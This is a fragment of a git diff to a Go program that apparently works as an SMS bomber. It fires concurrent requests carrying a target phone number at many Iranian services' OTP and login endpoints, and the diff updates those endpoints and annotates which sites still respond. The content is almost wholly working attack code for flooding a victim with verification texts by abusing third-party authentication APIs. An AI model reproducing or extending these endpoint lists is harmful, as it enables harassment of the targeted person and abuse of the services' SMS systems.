@@ -116,10 +116,10 @@ func main() {
 		}, ch)  // error site = not registry
 		go sms("https://flightio.com/bff/Authentication/CheckUserKey", map[string]interface{}{
 			"userKey": phone,
-		}, ch)  //ofline site = not code
+		}, ch)   // just check
 		go sms("https://app.snapp.taxi/api/api-passenger-oauth/v2/otp", map[string]interface{}{
 			"cellphone": phone,
-		}, ch)  //ofline site = not code
+		}, ch)   // just check
 		go sms("https://bck.behtarino.com/api/v1/users/jwt_phone_verification/", map[string]interface{}{
 			"phone": phone,
 		}, ch)  // edit :4/22/2025
@@ -163,29 +163,26 @@ func main() {
 			"mobile": phone,
 		}, ch)    // add site
  /////////////////////////////////////// site aparat should definitely be added.
-		go sms("https://bama.ir/signin-checkforcellnumber", map[string]interface{}{
-			"cellNumber=": phone,
-		}, ch) 
-		go sms("https://snappfood.ir/mobile/v2/user/loginMobileWithNoPass?lat=35.774&long=51.418&optionalClient=WEBSITE&client=WEBSITE&deviceType=WEBSITE&appVersion=8.1.0&UDID=39c62f64-3d2d-4954-9033-816098559ae4&locale=fa", map[string]interface{}{
-			"cellphone": phone,
-		}, ch)
+/////////////////////////////////////// added snapp food 
+		go sms("https://account.bama.ir/api/otp/generate/v4", map[string]interface{}{
+			"username": phone,
+		}, ch)  // edit :4/22/2025
 		go sms("https://ws.alibaba.ir/api/v3/account/mobile/otp", map[string]interface{}{
 			"phoneNumber": phone,
-		}, ch)
-		// go sms("https://api.snapp.market/mart/v1/user/loginMobileWithNoPass?cellphone=0", map[string]interface{}{
-		// 	"":phone}, ch)
+		}, ch)   // edit :4/22/2025
+		go sms("https://api.snapp.market/mart/v1/user/loginMobileWithNoPass?cellphone=0", map[string]interface{}{
+		 	"cellphone": phone,
+                }, ch)  // edit :4/22/2025
 		go sms("https://api.bitbarg.com/api/v1/authentication/registerOrLogin", map[string]interface{}{
 			"phone": phone,
-		}, ch)
+		}, ch)  // delete site: no Access
 		go sms("https://api.bahramshop.ir/api/user/validate/username", map[string]interface{}{
 			"username": phone,
-		}, ch)
+		}, ch)  // error site: secure connection
 		go sms("https://mobapi.banimode.com/api/v2/auth/request", map[string]interface{}{
 			"phone": phone,
-		}, ch)
-		go sms("https://takshopaccessorise.ir/api/v1/sessions/login_request", map[string]interface{}{
-			"mobile_phone": phone,
-		}, ch)
+		}, ch)  // edit :4/22/2025
+ //delete site : not box phone number
 		go sms("https://api.bitpin.ir/v1/usr/sub_phone/", map[string]interface{}{
 			"phone=": phone,
 		}, ch)
